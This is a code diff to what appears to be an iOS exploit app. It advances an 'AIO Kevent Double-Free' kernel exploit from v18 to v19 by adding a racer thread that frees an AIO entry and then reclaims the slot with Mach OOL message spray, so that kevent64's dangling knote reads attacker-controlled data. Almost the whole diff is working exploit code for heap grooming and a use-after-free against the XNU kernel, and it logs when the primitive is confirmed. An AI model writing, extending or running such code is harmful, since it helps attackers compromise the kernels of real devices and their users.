@@ -245,6 +245,18 @@ struct aio_race_state {
     int nrcbs;
 };
 
+// v19: E2 racer state — aio_return frees E2's slot, OOL spray reclaims it.
+// kevent64's dangling knote then reads OOL data through entry struct offsets.
+struct e2_ool_race_state {
+    atomic_bool start, stop;
+    atomic_bool freed;
+    atomic_bool ool_sent;
+    struct aiocb *e2;
+    void *payload;
+    int oolSize;
+    mach_port_t oolPort;
+};
+
 static void aio_set_thread_affinity(int tag) {
     thread_affinity_policy_data_t pol = { .affinity_tag = tag };
     thread_policy_set(mach_thread_self(), THREAD_AFFINITY_POLICY,
@@ -270,6 +282,46 @@ static void *aio_free_and_reclaim_racer(void *arg) {
                     if (ok == s->nrcbs) {
                         atomic_store_explicit(&s->reclaim_done, true, memory_order_release);
                     }
+                }
+                return NULL;
+            }
+        }
+    }
+    return NULL;
+}
+
+// v19: Racer that frees E2's slot via aio_return then immediately reclaims
+// the same slot with an OOL message (mach_msg PHYSICAL_COPY → kalloc.256).
+// Same CPU-affinity LIFO mechanism as Phase A, but OOL data replaces AIO entry data.
+// kevent64's dangling knote pointer reads the OOL payload through entry field offsets.
+static void *e2_free_and_ool_racer(void *arg) {
+    struct e2_ool_race_state *s = (struct e2_ool_race_state *)arg;
+    aio_set_thread_affinity(42);
+    while (!atomic_load_explicit(&s->start, memory_order_acquire));
+    while (!atomic_load_explicit(&s->stop, memory_order_relaxed)) {
+        if (aio_error(s->e2) == 0) {
+            ssize_t r = aio_return(s->e2);
+            if (r >= 0) {
+                atomic_store_explicit(&s->freed, true, memory_order_release);
+                typedef struct {
+                    mach_msg_header_t header;
+                    mach_msg_body_t body;
+                    mach_msg_ool_descriptor_t ool;
+                } OolMsg;
+                OolMsg msg;
+                memset(&msg, 0, sizeof(msg));
+                msg.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
+                msg.header.msgh_size = sizeof(msg);
+                msg.header.msgh_remote_port = s->oolPort;
+                msg.header.msgh_id = 0xE200;
+                msg.body.msgh_descriptor_count = 1;
+                msg.ool.type = MACH_MSG_OOL_DESCRIPTOR;
+                msg.ool.address = s->payload;
+                msg.ool.size = s->oolSize;
+                msg.ool.deallocate = FALSE;
+                msg.ool.copy = MACH_MSG_PHYSICAL_COPY;
+                if (mach_msg(&msg.header, MACH_SEND_MSG, sizeof(msg), 0, MACH_PORT_NULL, 0, MACH_PORT_NULL) == MACH_MSG_SUCCESS) {
+                    atomic_store_explicit(&s->ool_sent, true, memory_order_release);
                 }
                 return NULL;
             }
@@ -5681,7 +5733,7 @@ static void *aio_free_and_reclaim_racer(void *arg) {
         _aioLast = now;
     }
 
-    [self appendLog:@"\n========== AIO Kevent Double-Free v18 =========="];
+    [self appendLog:@"\n========== AIO Kevent Double-Free v19 =========="];
 
     // Disable button to prevent double-tap
     dispatch_async(dispatch_get_main_queue(), ^{
@@ -5984,8 +6036,14 @@ static void *aio_free_and_reclaim_racer(void *arg) {
     }
     [self appendLog:[NSString stringWithFormat:@"  Magazine drain: %d/%d OOL msgs sent (kalloc.256 consumed)", drainSent, kDrainTotal]];
 
-    // Now the magazine should be depleted. The double-freed slot should be near
-    // the freelist head. Allocate E1 (AIO), then spray one more OOL → overlap?
+    // ---- v19: E2 + racer free + OOL reclaim → kevent64 reads OOL data ----
+    // Same pattern as Phase A double-free: racer frees entry via aio_return,
+    // then immediately reclaims the same slot — but with OOL spray instead of
+    // aio_read. kevent64's dangling knote reads OOL data through entry fields.
+    // filt_aioprocess: ext[0]=errorval(@+0x28), ext[1]=returnval(@+0x20).
+    // With byte-offset payload[i]=i:
+    //   ext[0] = 0x2F2E2D2C2B2A2928 (bytes 0x28-0x2F)
+    //   ext[1] = 0x2726252423222120 (bytes 0x20-0x27)
     {
         int e2kq = kqueue();
         static struct aiocb e2;
@@ -6001,52 +6059,62 @@ static void *aio_free_and_reclaim_racer(void *arg) {
         e2.aio_sigevent.sigev_value.sival_ptr = (void *)0xBB;
         int e2ok = (aio_read(&e2) == 0);
         [self appendLog:[NSString stringWithFormat:@"  E2 aio_read: %@", e2ok ? @"OK" : @"FAIL"]];
-        if (e2ok && drainPayload && drainPortsReady > 0 && overlapSend != MACH_PORT_NULL) {
-            // Wait for E2 to complete BEFORE overlap
+        if (e2ok && drainPayload && overlapSend != MACH_PORT_NULL) {
             while (aio_error(&e2) == EINPROGRESS) usleep(100);
             [self appendLog:[NSString stringWithFormat:@"  E2 done, aio_error=%d", aio_error(&e2)]];
-            // Send overlap OOL to reclaim the double-freed slot (which E2 may hold)
-            [self appendLog:@"  D: sending overlap OOL..."];
-            DrainMsg overlapMsg;
-            memset(&overlapMsg, 0, sizeof(overlapMsg));
-            overlapMsg.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
-            overlapMsg.header.msgh_size = sizeof(DrainMsg);
-            overlapMsg.header.msgh_remote_port = overlapSend;
-            overlapMsg.header.msgh_id = 9999;
-            overlapMsg.body.msgh_descriptor_count = 1;
-            overlapMsg.ool.type = MACH_MSG_OOL_DESCRIPTOR;
-            overlapMsg.ool.address = drainPayload;
-            overlapMsg.ool.size = kDrainOolSize;
-            overlapMsg.ool.deallocate = FALSE;
-            overlapMsg.ool.copy = MACH_MSG_PHYSICAL_COPY;
-            kern_return_t okr = mach_msg(&overlapMsg.header, MACH_SEND_MSG, sizeof(overlapMsg),
-                     0, MACH_PORT_NULL, 0, MACH_PORT_NULL);
-            [self appendLog:[NSString stringWithFormat:@"  D: overlap send kr=%d", okr]];
 
-            // ---- Phase E: kevent64 read of overlapped E2 slot ----
-            // filt_aioprocess reads errorval→ext[0], returnval→ext[1] from
-            // the OOL payload. procp=0 → TAILQ_REMOVE skipped. Safe.
-            [self appendLog:@"\n--- Phase E: kevent64 read of overlapped slot ---"];
-            struct kevent64_s kev = {};
-            struct timespec ts = {5, 0};
-            int nev = kevent64(e2kq, NULL, 0, &kev, 1, 0, &ts);
-            if (nev > 0) {
-                [self appendLog:[NSString stringWithFormat:@"  E: kevent64 returned event"]];
-                [self appendLog:[NSString stringWithFormat:@"  E: ident  = 0x%llx", kev.ident]];
-                [self appendLog:[NSString stringWithFormat:@"  E: data   = 0x%llx", (uint64_t)kev.data]];
-                [self appendLog:[NSString stringWithFormat:@"  E: udata  = 0x%llx", kev.udata]];
-                [self appendLog:[NSString stringWithFormat:@"  E: ext[0] = 0x%llx (errorval from OOL)", kev.ext[0]]];
-                [self appendLog:[NSString stringWithFormat:@"  E: ext[1] = 0x%llx (returnval from OOL)", kev.ext[1]]];
-            } else if (nev == 0) {
-                [self appendLog:@"  E: kevent64 timeout — knote gone"];
-                ssize_t rv = aio_return(&e2);
-                [self appendLog:[NSString stringWithFormat:@"  E: aio_return fallback = %lld", (long long)rv]];
+            // v19: Racer thread frees E2's slot, then immediately OOL-reclaims it
+            struct e2_ool_race_state rs = {};
+            rs.e2 = &e2;
+            rs.payload = drainPayload;
+            rs.oolSize = kDrainOolSize;
+            rs.oolPort = overlapSend;
+
+            pthread_t thr;
+            pthread_create(&thr, NULL, e2_free_and_ool_racer, &rs);
+            atomic_store_explicit(&rs.start, true, memory_order_release);
+            usleep(500);
+            atomic_store_explicit(&rs.stop, true, memory_order_release);
+            pthread_join(thr, NULL);
+
+            bool freed = atomic_load(&rs.freed);
+            bool ool_sent = atomic_load(&rs.ool_sent);
+            [self appendLog:[NSString stringWithFormat:@"  v19 racer: freed=%d ool_sent=%d", freed, ool_sent]];
+
+            if (freed && ool_sent) {
+                [self appendLog:@"\n--- Phase E v19: kevent64 read of OOL-reclaimed slot ---"];
+                struct kevent64_s kev = {};
+                struct timespec ts = {5, 0};
+                int nev = kevent64(e2kq, NULL, 0, &kev, 1, 0, &ts);
+                if (nev > 0) {
+                    [self appendLog:[NSString stringWithFormat:@"  E: ident  = 0x%llx", kev.ident]];
+                    [self appendLog:[NSString stringWithFormat:@"  E: data   = 0x%llx", (uint64_t)kev.data]];
+                    [self appendLog:[NSString stringWithFormat:@"  E: udata  = 0x%llx", kev.udata]];
+                    [self appendLog:[NSString stringWithFormat:@"  E: ext[0] = 0x%llx (errorval @+0x28)", kev.ext[0]]];
+                    [self appendLog:[NSString stringWithFormat:@"  E: ext[1] = 0x%llx (returnval @+0x20)", kev.ext[1]]];
+
+                    uint64_t expect_ext1 = 0x2726252423222120ULL;
+                    uint64_t expect_ext0 = 0x2F2E2D2C2B2A2928ULL;
+                    if (kev.ext[1] == expect_ext1 && kev.ext[0] == expect_ext0) {
+                        [self appendLog:@"  >> CONFIRMED: OOL data read via dangling knote! <<"];
+                        [self appendLog:@"  >> AIO entry field offsets mapped <<"];
+                    } else if (kev.ext[1] == 0x1000 || kev.ext[1] == 0x2000) {
+                        [self appendLog:@"  >> OOL reclaim missed slot (still AIO data) <<"];
+                    } else {
+                        [self appendLog:@"  >> Unknown data — OOL may have landed at different offset <<"];
+                    }
+                } else if (nev == 0) {
+                    [self appendLog:@"  E: kevent64 timeout — knote gone"];
+                } else {
+                    [self appendLog:[NSString stringWithFormat:@"  E: kevent64 error nev=%d errno=%d", nev, errno]];
+                }
             } else {
-                [self appendLog:[NSString stringWithFormat:@"  E: kevent64 error nev=%d errno=%d", nev, errno]];
+                [self appendLog:@"  v19: racer didn't free+OOL — skipping kevent64"];
+                aio_return(&e2);
             }
             close(e2kq);
         } else {
-            [self appendLog:[NSString stringWithFormat:@"  D: SKIP — e2ok=%d payload=%p ports=%d", e2ok, drainPayload, drainPortsReady]];
+            [self appendLog:[NSString stringWithFormat:@"  E2 SKIP: e2ok=%d payload=%p overlapSend=0x%x", e2ok, drainPayload, overlapSend]];
             if (e2ok) {
                 while (aio_error(&e2) == EINPROGRESS) usleep(100);
                 aio_return(&e2);
